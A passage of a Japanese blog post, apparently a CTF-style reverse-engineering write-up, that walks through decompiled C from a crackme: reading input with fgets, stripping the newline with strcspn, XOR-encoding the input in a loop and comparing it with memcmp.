&lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt; lVar5&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;^&lt;/span&gt; cVar1 &lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;char&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;lVar5&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
      lVar5 &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; lVar5 &lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;lVar5 &lt;span class=&quot;token operator&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0x40&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  
  &lt;span class=&quot;token comment&quot;&gt;/* local_68 の値とPTR_DAT_00104010の値を 0x40 バイト分比較する */&lt;/span&gt;
    iVar2 &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;memcmp&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;&amp;amp;&lt;/span&gt;local_68&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;PTR_DAT_00104010&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;0x40&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;iVar2 &lt;span class=&quot;token operator&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
      &lt;span class=&quot;token function&quot;&gt;puts&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;You got it!&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;token keyword&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
      &lt;span class=&quot;token function&quot;&gt;puts&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;That\&apos;s not it...&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
      iVar2 &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;
  &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;
  &lt;span class=&quot;token comment&quot;&gt;/* 中略 */&lt;/span&gt; 
&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;上記より、このmain関数は大きく以下の4つの処理に分割されていることがわかります。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;ユーザからの標準入力(stdin)を受けとって &lt;code class=&quot;language-text&quot;&gt;local_68&lt;/code&gt;に格納している&lt;/li&gt;
&lt;li&gt;改行文字を特定し、ヌル文字に変更（バイト列が文字列として評価される場合、0は&lt;code class=&quot;language-text&quot;&gt;\0&lt;/code&gt;と同値として扱われます）
参考：&lt;a href=&quot;https://stackoverflow.com/questions/1296843/what-is-the-difference-between-null-0-and-0&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;c - What is the difference between NULL, ‘\0’ and 0? - Stack Overflow&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;謎のループ処理&lt;/li&gt;
&lt;li&gt;local&lt;em&gt;68 の値とPTR&lt;/em&gt;DAT_00104010の値を 0x40 バイト分比較する&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;まずは&lt;code class=&quot;language-text&quot;&gt;local_68&lt;/code&gt;の変数名を&lt;code class=&quot;language-text&quot;&gt;input_text&lt;/code&gt;などに変更してから順番に解析を進めていきましょう。&lt;/p&gt;
&lt;h3 id=&quot;標準入力の受け取り&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E6%A8%99%E6%BA%96%E5%85%A5%E5%8A%9B%E3%81%AE%E5%8F%97%E3%81%91%E5%8F%96%E3%82%8A&quot; aria-label=&quot;標準入力の受け取り permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;標準入力の受け取り&lt;/h3&gt;
&lt;p&gt;最初に見ていくのは以下のコードです。&lt;/p&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;fgets&lt;/code&gt;関数で最大0x40文字分の入力を標準入力から受け取り、変数&lt;code class=&quot;language-text&quot;&gt;input_text&lt;/code&gt;に格納します。&lt;/p&gt;
&lt;p&gt;もし読み取りに失敗した場合は、&lt;code class=&quot;language-text&quot;&gt;no!!&lt;/code&gt;という文字列を出力して終了します。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;c&quot;&gt;&lt;pre class=&quot;language-c&quot;&gt;&lt;code class=&quot;language-c&quot;&gt;pcVar3 &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;fgets&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;&amp;amp;&lt;/span&gt;input_text&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;0x40&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;token constant&quot;&gt;stdin&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;pcVar3 &lt;span class=&quot;token operator&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;0x0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;				    
	&lt;span class=&quot;token function&quot;&gt;puts&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;no!!&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
	iVar2 &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;fgets&lt;/code&gt;関数は、ストリーム（FILEオブジェクト）から指定したバイト数のデータを読み取ることのできる関数です。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://www.tutorialspoint.com/c_standard_library/c_function_fgets.htm&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;C library function - fgets()&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;なぜこの関数でユーザの入力を受け取ることができるかというと、LinuxやUNIX系のシステムでは、ほとんどのデバイスがファイルとして抽象化されて扱われるからです。&lt;/p&gt;
&lt;p&gt;Linuxシステムでは、以下のマニュアルに記載されているようにFILEオブジェクト&lt;code class=&quot;language-text&quot;&gt;stdin&lt;/code&gt;が標準入力を受け取るインプットストリームとして定義されています。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://man7.org/linux/man-pages/man3/stdout.3.html&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;stdin(3) - Linux manual page&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;そのため&lt;code class=&quot;language-text&quot;&gt;fgets&lt;/code&gt;関数で入力値を受け取ることができるのです。&lt;/p&gt;
&lt;p&gt;より詳しく知りたい方は、以下の書籍などがわかりやすくて参考になると思います。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://amzn.to/3oMmsPY&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;動かしながらゼロから学ぶ Linuxカーネルの教科書&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&quot;改行文字の削除&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E6%94%B9%E8%A1%8C%E6%96%87%E5%AD%97%E3%81%AE%E5%89%8A%E9%99%A4&quot; aria-label=&quot;改行文字の削除 permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;改行文字の削除&lt;/h3&gt;
&lt;p&gt;次に焦点とするのはこの部分です。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;c&quot;&gt;&lt;pre class=&quot;language-c&quot;&gt;&lt;code class=&quot;language-c&quot;&gt;sVar4 &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;strcspn&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;&amp;amp;&lt;/span&gt;input_text&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;\n&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;	 
&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;undefined &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;long&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;&amp;amp;&lt;/span&gt;input_text &lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt; sVar4&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;strcspn&lt;/code&gt;関数は、第一引数として受け取った文字列の中から、第二引数(reject)として受け取った文字を含まない文字だけで構成される最初の文字列の長さを返却する関数です。&lt;/p&gt;
&lt;p&gt;つまり、&lt;code class=&quot;language-text&quot;&gt;strcspn&lt;/code&gt;関数を使うと、任意の文字が最初に登場する場所を特定することができます。&lt;/p&gt;
&lt;p&gt;今回は、標準入力から受け取った文字列の中から、改行文字&lt;code class=&quot;language-text&quot;&gt;\n&lt;/code&gt;の位置を特定し、改行文字の存在する場所のバイトを0に変更しています。&lt;/p&gt;
&lt;p&gt;なぜこのようなことをしているかというと、標準入力から受け取った文字列には改行文字が含まれているためです。&lt;/p&gt;
&lt;p&gt;実際にメモリの中身を見てみると、以下のように改行文字&lt;code class=&quot;language-text&quot;&gt;0x0a&lt;/code&gt;が入力文字の後に続いていることがわかります。&lt;/p&gt;
&lt;p&gt;&lt;span
      class=&quot;gatsby-resp-image-wrapper&quot;
      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 500px; &quot;
    &gt;
      &lt;a
    class=&quot;gatsby-resp-image-link&quot;
    href=&quot;/static/672f64caed316a94d051034a865f6586/0b533/image-38.png&quot;
    style=&quot;display: block&quot;
    target=&quot;_blank&quot;
    rel=&quot;noopener&quot;
  &gt;
    &lt;span
    class=&quot;gatsby-resp-image-background-image&quot;
    style=&quot;padding-bottom: 68.33333333333333%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAOCAYAAAAvxDzwAAAACXBIWXMAARlAAAEZQAGA43XUAAACWklEQVQ4y41TaVOjQBDNl1010dJcJMaVAAMknAOEEEhiNgc5XPcoa/f//5W3zaBWdN0qP7wamOl5069fdyWUGJbKBAt5BN5SEbRV8LaCoEvfUh9BR0PYM2hVkTRUHE5l5DW5jO0qIr44i7sD+DUdlcNwiXv7Kx7cFZb9BN6phqRpIagZyKQBYUj/BsJzDc5nBvvUgFs1welcoGrQHQbvTIdfZaj85DkeR3v8Tu6xM6ZwTxRktzbCho5UsTA3XMxNB6lsIaSsJjI91LcwkVykHQ/jpk1kGpFpYq388Df4FW6JdIcNS8XmisUYtywcvCm29gRTmUhlLnDHOPiVKpQUsSUZE/CKDAvCx2iHP+MDtnpGGarYaBnCCxP7wQI5y2B/UkiuUpKcaELiM8kxBOF3b4WVOUPuLDFTqIaXA6qZjcWXCCs1wbwXiO9ij9fKOomsnrM7gpBcGBG0DfjkdnBduGkibjjYmnNs9ClyyvIh2GNxW5TBRUgPelVdOPoaRmnKQknhNkPw7hh+h8ivbKy1CdbqhIgtZN0AKaHI7rhe/0NlyWZw2zH4dQJ+M0VQd3AY3mF2zeGQ46UUtbxwxo4kPktnryWvBCE1dTeB/0S4H8xF7YoWenn9Tb1ekx8RLtQMTpEhSea9lFrCoX6ck1QfNjnrPxnxUVSyXoS4xkSbeETG6zRqLYas42NUt+AW0t414R1TitHL+2PcNYcYN2g6pAgRdX/UcRFLARLJw+iSIbo0X6bhX+lvJK8ljsVNTBMww85a4puX495dI6rb8M9phi90BBfGhxwuYv4CuXyShJ/DfxwAAAAASUVORK5CYII=&apos;); background-size: cover; display: block;&quot;
  &gt;&lt;/span&gt;
  &lt;picture&gt;
          &lt;source
              srcset=&quot;/static/672f64caed316a94d051034a865f6586/8ac56/image-38.webp 240w,
/static/672f64caed316a94d051034a865f6586/d3be9/image-38.webp 480w,
/static/672f64caed316a94d051034a865f6586/b0a15/image-38.webp 500w&quot;
              sizes=&quot;(max-width: 500px) 100vw, 500px&quot;
              type=&quot;image/webp&quot;
            /&gt;
          &lt;source
            srcset=&quot;/static/672f64caed316a94d051034a865f6586/8ff5a/image-38.png 240w,
/static/672f64caed316a94d051034a865f6586/e85cb/image-38.png 480w,
/static/672f64caed316a94d051034a865f6586/0b533/image-38.png 500w&quot;
            sizes=&quot;(max-width: 500px) 100vw, 500px&quot;
            type=&quot;image/png&quot;
          /&gt;
          &lt;img
            class=&quot;gatsby-resp-image-image&quot;
            src=&quot;/static/672f64caed316a94d051034a865f6586/0b533/image-38.png&quot;
            alt=&quot;2021/12/image-38.png&quot;
            title=&quot;2021/12/image-38.png&quot;
            loading=&quot;lazy&quot;
            style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
          /&gt;
        &lt;/picture&gt;
  &lt;/a&gt;
    &lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;0x0a&lt;/code&gt;は、LF（ラインフィード）というASCIIで定義された制御文字を意味します。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://www.tohoho-web.com/wwwxx011.htm&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;改行コードについて - とほほのWWW入門&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;次に、実際に置換処理が行われた行まで実行を進めてみると、改行文字がメモリから消去されたことがわかります。&lt;/p&gt;
&lt;p&gt;&lt;span
      class=&quot;gatsby-resp-image-wrapper&quot;
      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 500px; &quot;
    &gt;
      &lt;a
    class=&quot;gatsby-resp-image-link&quot;
    href=&quot;/static/dc631afeaeb42eb8be848e9f570f9cff/0b533/image-39.png&quot;
    style=&quot;display: block&quot;
    target=&quot;_blank&quot;
    rel=&quot;noopener&quot;
  &gt;
    &lt;span
    class=&quot;gatsby-resp-image-background-image&quot;
    style=&quot;padding-bottom: 57.50000000000001%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAMCAYAAABiDJ37AAAACXBIWXMAARlAAAEZQAGA43XUAAAB70lEQVQoz42T2XLaQBBF9RQbTAgYidVgbQghpGEktLODcIGdSuIk//8rN42UpJxKiP1walTqmTt9u3sErzXEahBgq0Zw2waiqozsRoUranBbtEoGZn2bvnXM6gr21/c4VFQEdG7WJdpDcEnJ47xqQDiZWzxO1vg43eOgpZhcUbBpUVCHL40R9WwkA4aoQ/9qOphEIj0LoWgjbNgIbidgJQ3ONVHWIDzZW3x2M3wNjjgMUwooCM631jSEA4MggcYIvmgioAvC5hjT92q+zykVsLJaUFJJcLLDJ77Hs3/EgzGHfSVjpXhkb4TdKEA2DmkzHSyfRQrOGbHyC0qFmJML2jt8cff4Hp5wMpew391jIXO4dR1rnWNjuphKMvit8rfQPxDWA2qGxOF3fHjtGVjVxPLOx0aOkHY41kqKoOnl9WE3+mUqw3wVHswNLJGEeinY3QKsbuNIme61JK+TR53jFT23w96AsFES2CLZ6kREDFazSCzGoufBIvvOz9q8ZvW35Wy4xET0MO3GRAL2wUJG2a36s1zwV9GdF4W/lF3elAXVyyGRaY3mqcFJ0MS85yJusf/X7ALCRl0grY0QSwy8FSDs0GvpG5h3PcRNp2jGm9ALywk1IW5yJNoKTyzDNxrwZ+8Avz6mVyP/MWevcbb8A3W3V/ixMCVVAAAAAElFTkSuQmCC&apos;); background-size: cover; display: block;&quot;
  &gt;&lt;/span&gt;
  &lt;picture&gt;
          &lt;source
              srcset=&quot;/static/dc631afeaeb42eb8be848e9f570f9cff/8ac56/image-39.webp 240w,
/static/dc631afeaeb42eb8be848e9f570f9cff/d3be9/image-39.webp 480w,
/static/dc631afeaeb42eb8be848e9f570f9cff/b0a15/image-39.webp 500w&quot;
              sizes=&quot;(max-width: 500px) 100vw, 500px&quot;
              type=&quot;image/webp&quot;
            /&gt;
          &lt;source
            srcset=&quot;/static/dc631afeaeb42eb8be848e9f570f9cff/8ff5a/image-39.png 240w,
/static/dc631afeaeb42eb8be848e9f570f9cff/e85cb/image-39.png 480w,
/static/dc631afeaeb42eb8be848e9f570f9cff/0b533/image-39.png 500w&quot;
            sizes=&quot;(max-width: 500px) 100vw, 500px&quot;
            type=&quot;image/png&quot;
          /&gt;
          &lt;img
            class=&quot;gatsby-resp-image-image&quot;
            src=&quot;/static/dc631afeaeb42eb8be848e9f570f9cff/0b533/image-39.png&quot;
            alt=&quot;2021/12/image-39.png&quot;
            title=&quot;2021/12/image-39.png&quot;
            loading=&quot;lazy&quot;
            style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
          /&gt;
        &lt;/picture&gt;
  &lt;/a&gt;
    &lt;/span&gt;&lt;/p&gt;
&lt;p&gt;GDBの使い方については後述します。&lt;/p&gt;
&lt;h3 id=&quot;ループ処理で文字列をxor暗号化&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E3%83%AB%E3%83%BC%E3%83%97%E5%87%A6%E7%90%86%E3%81%A7%E6%96%87%E5%AD%97%E5%88%97%E3%82%92xor%E6%9A%97%E5%8F%B7%E5%8C%96&quot; aria-label=&quot;ループ処理で文字列をxor暗号化 permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;ループ処理で文字列をXOR暗号化&lt;/h3&gt;
&lt;p&gt;次の処理を見ると、謎の関数&lt;code class=&quot;language-text&quot;&gt;FUN_001011e9&lt;/code&gt;の戻り値にループカウンタ&lt;code class=&quot;language-text&quot;&gt;lVar5&lt;/code&gt;を加算した値を使って標準入力から受け取った文字列をXOR暗号化していることがわかります。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;c&quot;&gt;&lt;pre class=&quot;language-c&quot;&gt;&lt;code class=&quot;language-c&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;do&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
    cVar1 &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;FUN_001011e9&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;byte &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;long&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;&amp;amp;&lt;/span&gt;input_text &lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt; lVar5&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;byte &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;long&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;&amp;amp;&lt;/span&gt;input_text &lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt; lVar5&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;^&lt;/span&gt; cVar1 &lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;char&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;lVar5&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    lVar5 &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; lVar5 &lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;lVar5 &lt;span class=&quot;token operator&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0x40&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;XOR暗号についての詳細は割愛します。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://gist.github.com/matsubara0507/fada4760f42cd6a52c95&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;たのしいXOR暗号入門&lt;/a&gt;&lt;/p&gt;
